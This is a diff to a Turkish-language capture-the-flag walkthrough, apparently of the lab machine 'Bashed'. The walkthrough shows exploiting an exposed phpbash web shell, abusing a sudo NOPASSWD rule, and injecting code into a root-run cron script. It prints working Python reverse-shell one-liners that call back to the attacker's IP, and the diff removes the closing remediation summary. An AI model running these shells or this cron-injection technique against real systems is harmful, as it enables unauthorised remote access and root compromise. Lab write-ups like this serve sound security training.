@@ -30,7 +30,7 @@ ffuf -u http://10.129.51.18/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-
 
 <img width="582" height="318" alt="dev" src="https://github.com/user-attachments/assets/d0c2de47-420f-4d38-97e8-8ba569f0c918" />
 
-Karşımıza **phpbash** çıkıyor — açık kaynaklı, semi-interactive bir PHP web shell. Görünüşe göre bir geliştirici test ederken bırakmış ve kaldırmayı unutmuş.
+Karşımıza **phpbash** çıkıyor — açık kaynaklı, semi-interactive bir PHP web shell.
 
 ### 3. Foothold
 
@@ -53,7 +53,7 @@ rlwrap nc -nvlp 4444
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.187",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
-Bind shell yerine reverse shell'i tercih ediyoruz çünkü hedef muhtemelen firewall/NAT arkasında — outbound bağlantılar inbound'a göre çok daha az kısıtlanıyor.
+Bind shell yerine reverse shell'i tercih ediyoruz çünkü outbound bağlantılar inbound'a göre çok daha az kısıtlanıyor.
 
 ```
 connect to [10.10.14.187] from (UNKNOWN) [10.129.51.18] 46020
@@ -77,6 +77,9 @@ $ sudo -l
 User www-data may run the following commands on bashed:
     (scriptmanager : scriptmanager) NOPASSWD: ALL
 ```
+
+<img width="744" height="542" alt="sudol" src="https://github.com/user-attachments/assets/43414f60-73f4-4b31-b0aa-1fcffd425842" />
+
 
 `www-data`, şifre girmeden `scriptmanager` kimliğiyle **herhangi bir komutu** çalıştırabiliyoruz — kural muhtemelen tek bir script'e izin vermek için yazılmış, `ALL` ile kapsam tamamen genişletilmiş. Klasik bir sudo misconfiguration ile karşı karşıyayız.
 
@@ -102,7 +105,7 @@ Zinciri şöyle kuruyoruz:
 3. `scriptmanager` context'imiz bu dizine dosya yazmamıza yetiyor.
 4. **Sonuç:** Buraya bıraktığımız herhangi bir kod, root tarafından root yetkisiyle execute ediliyor — klasik *writable path + privileged scheduled execution* kombinasyonu.
 
-İkinci bir listener açıyoruz (ilk shell'imizi koruyoruz):
+İkinci bir listener açıyoruz:
 
 ```bash
 rlwrap nc -nvlp 4445
@@ -114,7 +117,7 @@ rlwrap nc -nvlp 4445
 echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.187",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> /scripts/test.py
 ```
 
-Port'u `4444`'ten farklı seçiyoruz (`4445`), aktif ilk shell'imizle karışmasın diye. `echo ... >>` kullanıyoruz çünkü elimizde interaktif bir editör yok — dosyayı doğrudan oluşturup içeriği tek satırda yazıyoruz.
+<img width="890" height="182" alt="sudol2" src="https://github.com/user-attachments/assets/8d2fa31e-a501-4873-9697-47608b1e38a6" />
 
 Cron'un bir sonraki tetiklenmesini bekliyoruz (tipik olarak ≤1 dakika):
 
@@ -132,11 +135,4 @@ root
 # cat root.txt
 7296b59278b52eb59fbb3c51f8043a27
 ```
-
-Root flag'i de aldık.
-
----
-
-### Özet
-
-Zincir üç yapılandırma hatasının üst üste gelmesinden oluşuyor: production'da unutulmuş bir debug web shell (phpbash) bize doğrudan RCE veriyor; `sudo -l` çıktısındaki `NOPASSWD: ALL` kuralı `scriptmanager`'a sınırsız komut çalıştırma yetkisi tanıyor; ve root'a ait bir cron job, düşük yetkili bir kullanıcı tarafından yazılabilir bir dizini (`/scripts`) kontrolsüzce execute ediyor. Kalıcı çözüm olarak şunları öneriyoruz: geliştirme araçlarını CI/CD seviyesinde production'dan hariç tutmak, sudo kurallarını komut bazında en az yetkiyle (`Cmnd_Alias` + spesifik path) sınırlandırmak, ve root tarafından çalıştırılan her cron script'inin sahiplik/yazma izinlerini düzenli denetlemek.
+<img width="503" height="302" alt="rootflag" src="https://github.com/user-attachments/assets/70358fd9-00a0-405b-8b72-8f0c44f2e6c4" />
